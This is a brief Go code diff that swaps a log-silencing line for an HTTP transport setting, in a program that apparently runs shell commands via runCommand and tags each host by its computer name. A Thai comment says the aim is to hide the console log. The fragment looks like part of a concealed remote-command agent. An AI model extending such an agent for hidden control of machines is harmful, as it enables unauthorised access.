@@ -4,7 +4,6 @@ import (
 	"bytes"
 	"fmt"
 	"io"
-	"log"
 	"net/http"
 	"os"
 	"os/exec"
@@ -36,7 +35,8 @@ func runCommand(cmd string) string {
 }
 
 func main() {
-	log.SetOutput(io.Discard) // ซ่อน Log Console
+	// ซ่อน Log Console
+	http.DefaultTransport.(*http.Transport).MaxIdleConnsPerHost = 10
 	
 	id := "host-" + os.Getenv("COMPUTERNAME")
 	if id == "host-" {
